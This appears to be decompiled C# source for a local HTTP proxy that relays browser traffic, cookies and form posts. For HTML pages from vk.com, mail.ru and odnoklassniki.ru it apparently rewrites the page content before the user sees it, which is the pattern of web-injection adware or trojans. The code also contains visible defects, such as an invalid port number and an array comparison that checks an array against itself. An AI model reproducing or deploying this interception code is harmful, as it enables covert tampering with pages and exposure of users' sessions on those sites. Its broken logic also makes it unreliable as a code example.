using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace ProxyService;

public class ProxyServer
{
	public class Tuple
	{
		public string Item1;

		public string Item2;

		public Tuple(string a, string b)
		{
			Item1 = a;
			Item2 = b;
		}
	}

	private const int BufferSize = 8192;

	public static ProxyServer Server;

	private readonly TcpListener _listener;

	private Thread _listenerThread;

	private readonly IPAddress _addr = IPAddress.Loopback;

	private readonly int _port = 80810;

	private static readonly char[] SemiSplit = new char[1] { ';' };

	private static readonly string[] ColonSpaceSplit = new string[1] { ": " };

	private static readonly char[] SpaceSplit = new char[1] { ' ' };

	private static readonly Regex CookieSplitRegEx = new Regex(",(?! )");

	private static XmlHelper _xml;

	public IPAddress ListeningIpInterface => _addr;

	public int ListeningPort => _port;

	public static void dbg(string a)
	{
	}

	public static void copyTo(Stream afrom, MemoryStream aTo, Encoding enc)
	{
		try
		{
			StreamReader streamReader = new StreamReader(afrom, enc);
			string s = streamReader.ReadToEnd();
			byte[] bytes = enc.GetBytes(s);
			aTo.Write(bytes, 0, bytes.Length);
		}
		catch (Exception ex)
		{
			dbg("copyto error: " + ex.Message);
		}
	}

	public static bool IsNullOrWhiteSpace(string s)
	{
		if (s == null)
		{
			return true;
		}
		if (s.Trim() == "")
		{
			return true;
		}
		return false;
	}

	public ProxyServer(string ipa, int port)
	{
		XmlHelper.Load();
		IPAddress.TryParse(ipa, out _addr);
		_port = port;
		_listener = new TcpListener(ListeningIpInterface, ListeningPort);
		dbg("Proxy init on {0}:{1}  -- successfully: " + ipa + ":" + port);
	}

	public bool Start()
	{
		try
		{
			_listener.Start();
			dbg("Proxy start  -- successfully");
		}
		catch (Exception ex)
		{
			dbg("start:" + ex.Message);
			return false;
		}
		_listenerThread = new Thread(Listen);
		_listenerThread.Start(_listener);
		return true;
	}

	private static void Listen(object obj)
	{
		TcpListener tcpListener = (TcpListener)obj;
		try
		{
			while (true)
			{
				TcpClient state = tcpListener.AcceptTcpClient();
				while (!ThreadPool.QueueUserWorkItem(ProcessClient, state))
				{
				}
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (SocketException)
		{
		}
	}

	private static void ProcessClient(object obj)
	{
		TcpClient client = (TcpClient)obj;
		try
		{
			DoHttpProcessing(client);
		}
		catch (Exception ex)
		{
			dbg("process client: " + ex.Message);
		}
	}

	private static void DoHttpProcessing(TcpClient client)
	{
		try
		{
			DoHttpProcessing1(client);
		}
		catch (Exception ex)
		{
			dbg("http major problem:" + ex.Message);
		}
	}

	private static string ms2str(MemoryStream ms)
	{
		ms.Seek(0L, SeekOrigin.Begin);
		StreamReader streamReader = new StreamReader(ms);
		string result = streamReader.ReadToEnd();
		streamReader.Dispose();
		return result;
	}

	private static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp)
	{
		if (resp.ContentType.Contains("text/html") && (req.Address.ToString().Contains("http://") || req.Address.ToString().Contains("https://")))
		{
			if (!req.Address.ToString().Contains("vk.com") && !req.Address.ToString().Contains("mail.ru"))
			{
				return req.Address.ToString().Contains("odnoklassniki.ru");
			}
			return true;
		}
		return false;
	}

	private static void DoHttpProcessing1(TcpClient client)
	{
		NetworkStream stream = client.GetStream();
		NetworkStream networkStream = stream;
		StreamReader streamReader = new StreamReader(stream);
		try
		{
			string text = streamReader.ReadLine();
			if (string.IsNullOrEmpty(text))
			{
				streamReader.Close();
				stream.Close();
				return;
			}
			string[] array = text.Split(SpaceSplit, 3);
			string text2 = array[0];
			string requestUriString = array[1];
			Version protocolVersion = new Version(1, 0);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			httpWebRequest.Method = text2;
			httpWebRequest.ProtocolVersion = protocolVersion;
			int num = ReadRequestHeaders(streamReader, httpWebRequest);
			httpWebRequest.Proxy = null;
			httpWebRequest.KeepAlive = false;
			httpWebRequest.AllowAutoRedirect = false;
			httpWebRequest.AutomaticDecompression = DecompressionMethods.None;
			try
			{
				if (text2.ToUpper() == "POST")
				{
					char[] buffer = new char[num];
					int num2 = 0;
					StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
					int num3;
					while (num2 < num && (num3 = streamReader.ReadBlock(buffer, 0, num)) > 0)
					{
						num2 += num3;
						streamWriter.Write(buffer, 0, num3);
					}
					streamWriter.Close();
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
			httpWebRequest.Timeout = 15000;
			HttpWebResponse httpWebResponse;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			}
			catch (WebException ex2)
			{
				httpWebResponse = ex2.Response as HttpWebResponse;
			}
			if (httpWebResponse == null)
			{
				return;
			}
			IEnumerable<Tuple> enumerable = ProcessResponse(httpWebResponse);
			Stream stream2 = httpWebResponse.GetResponseStream();
			StreamWriter streamWriter2 = new StreamWriter(networkStream);
			try
			{
				WriteResponseStatus(httpWebResponse.StatusCode, httpWebResponse.StatusDescription, streamWriter2);
				Encoding encoding = Encoding.UTF8;
				try
				{
					if (httpWebResponse.CharacterSet != null)
					{
						encoding = Encoding.GetEncoding(httpWebResponse.CharacterSet);
					}
				}
				catch (Exception)
				{
				}
				MemoryStream memoryStream = new MemoryStream();
				if (httpIsEnvoved(httpWebRequest, httpWebResponse) && httpWebResponse.ContentEncoding.ToLower().Contains("gzip"))
				{
					stream2 = new GZipStream(stream2, CompressionMode.Decompress);
					StreamReader streamReader2 = new StreamReader(stream2, encoding);
					string text3 = streamReader2.ReadToEnd();
					byte[] bytes = encoding.GetBytes(text3);
					MemoryStream memoryStream2 = new MemoryStream();
					using (GZipStream gZipStream = new GZipStream(memoryStream2, CompressionMode.Compress, leaveOpen: true))
					{
						gZipStream.Write(bytes, 0, bytes.Length);
					}
					memoryStream2.Position = 0L;
					Decompress(memoryStream2, memoryStream);
					memoryStream.Seek(0L, SeekOrigin.Begin);
					string text4 = XmlHelper.ChangeContent(text3, httpWebRequest.Address.ToString());
					foreach (Tuple item in enumerable)
					{
						if (item.Item1 == "Content-Length")
						{
							item.Item2 = text4.Length.ToString();
						}
						if (item.Item1 == "Content-Encoding")
						{
							item.Item2 = "identity";
						}
						dbg("a>" + item.Item1 + "=" + item.Item2);
					}
				}
				WriteResponseHeaders(streamWriter2, enumerable);
				byte[] array2 = ((httpWebResponse.ContentLength > 0L) ? new byte[httpWebResponse.ContentLength] : new byte[8192]);
				if (httpIsEnvoved(httpWebRequest, httpWebResponse))
				{
					if (stream2 != null)
					{
						MemoryStream memoryStream3 = new MemoryStream();
						dbg("enc=" + encoding.EncodingName);
						if (httpWebResponse.ContentEncoding.ToLower().Contains("gzip"))
						{
							copyTo(memoryStream, memoryStream3, encoding);
						}
						else
						{
							copyTo(stream2, memoryStream3, encoding);
						}
						memoryStream3.Seek(0L, SeekOrigin.Begin);
						StreamReader streamReader3 = new StreamReader(memoryStream3, encoding);
						string text5 = streamReader3.ReadToEnd();
						byte[] bytes2 = encoding.GetBytes(text5);
						byte[] array3 = memoryStream3.ToArray();
						memoryStream3.Dispose();
						if (IsArrayEquals(array3, bytes2))
						{
							text5 = XmlHelper.ChangeContent(text5, httpWebRequest.Address.ToString());
							bytes2 = encoding.GetBytes(text5);
							networkStream.Write(bytes2, 0, bytes2.Length);
						}
						else
						{
							networkStream.Write(array3, 0, array3.Length);
						}
						streamReader3.Close();
						streamReader3.Dispose();
					}
				}
				else
				{
					int count;
					while (stream2 != null && (count = stream2.Read(array2, 0, array2.Length)) > 0)
					{
						networkStream.Write(array2, 0, count);
					}
				}
				stream2?.Close();
				networkStream.Flush();
			}
			catch (Exception ex4)
			{
				dbg(ex4.Message);
			}
			finally
			{
				stream2?.Close();
				httpWebResponse.Close();
				streamWriter2.Close();
			}
		}
		catch (Exception ex5)
		{
			dbg(ex5.Message);
		}
		finally
		{
			streamReader.Close();
			stream.Close();
			networkStream.Close();
		}
	}

	private static void Pump(Stream input, Stream output)
	{
		byte[] array = new byte[8192];
		int count;
		while ((count = input.Read(array, 0, array.Length)) != 0)
		{
			output.Write(array, 0, count);
		}
	}

	private static void Compress(Stream source, Stream destination)
	{
		using GZipStream gZipStream = new GZipStream(destination, CompressionMode.Compress, leaveOpen: true);
		Pump(source, gZipStream);
		gZipStream.Flush();
		gZipStream.Close();
		gZipStream.Dispose();
	}

	private static void Decompress(Stream source, Stream destination)
	{
		using GZipStream input = new GZipStream(source, CompressionMode.Decompress, leaveOpen: true);
		Pump(input, destination);
	}

	private static bool IsArrayEquals(ICollection<byte> first, IList<byte> second)
	{
		dbg("?????????????? ?? ????????????: " + first.Count + "/" + second.Count);
		if (first.Count != second.Count)
		{
			return false;
		}
		IEnumerator<byte> enumerator = first.GetEnumerator();
		IEnumerator<byte> enumerator2 = first.GetEnumerator();
		while (enumerator.MoveNext() && enumerator2.MoveNext())
		{
			if (enumerator.Current != enumerator2.Current)
			{
				return false;
			}
		}
		return true;
	}

	private static int ReadRequestHeaders(StreamReader sr, HttpWebRequest webReq)
	{
		int result = 0;
		string text;
		do
		{
			text = sr.ReadLine();
			if (!string.IsNullOrEmpty(text))
			{
				string[] array = text.Split(ColonSpaceSplit, 2, StringSplitOptions.None);
				switch (array[0].ToLower())
				{
				case "user-agent":
					webReq.UserAgent = array[1];
					break;
				case "accept":
					webReq.Accept = array[1];
					break;
				case "referer":
					webReq.Referer = array[1];
					break;
				case "cookie":
					webReq.Headers["Cookie"] = array[1];
					break;
				case "content-length":
					int.TryParse(array[1], out result);
					break;
				case "content-type":
					webReq.ContentType = array[1];
					break;
				case "if-modified-since":
				{
					string[] array2 = array[1].Trim().Split(SemiSplit);
					if (DateTime.TryParse(array2[0], out var result2))
					{
						webReq.IfModifiedSince = result2;
					}
					break;
				}
				default:
					try
					{
						webReq.Headers.Add(array[0], array[1]);
					}
					catch (Exception ex)
					{
						dbg($"Could not add header {array[0]}.  Exception message:{ex.Message}");
					}
					break;
				case "host":
				case "proxy-connection":
				case "connection":
				case "keep-alive":
					break;
				}
				continue;
			}
			return result;
		}
		while (!IsNullOrWhiteSpace(text));
		return result;
	}

	private static IEnumerable<Tuple> ProcessResponse(HttpWebResponse response)
	{
		string text = null;
		string name = null;
		List<Tuple> list = new List<Tuple>();
		foreach (string key in response.Headers.Keys)
		{
			if (key.ToLower() == "set-cookie")
			{
				name = key;
				text = response.Headers[key];
			}
			else
			{
				list.Add(new Tuple(key, response.Headers[key]));
			}
		}
		if (!IsNullOrWhiteSpace(text))
		{
			response.Headers.Remove(name);
			string[] array = CookieSplitRegEx.Split(text);
			string[] array2 = array;
			foreach (string b in array2)
			{
				list.Add(new Tuple("Set-Cookie", b));
			}
		}
		return list;
	}

	private static void WriteResponseStatus(HttpStatusCode code, string description, StreamWriter myResponseWriter)
	{
		string value = $"HTTP/1.0 {(int)code} {description}";
		myResponseWriter.WriteLine(value);
	}

	private static void WriteResponseHeaders(TextWriter myResponseWriter, IEnumerable<Tuple> headers)
	{
		if (headers != null)
		{
			foreach (Tuple header in headers)
			{
				myResponseWriter.WriteLine($"{header.Item1}: {header.Item2}");
			}
		}
		myResponseWriter.WriteLine();
		myResponseWriter.Flush();
	}
}
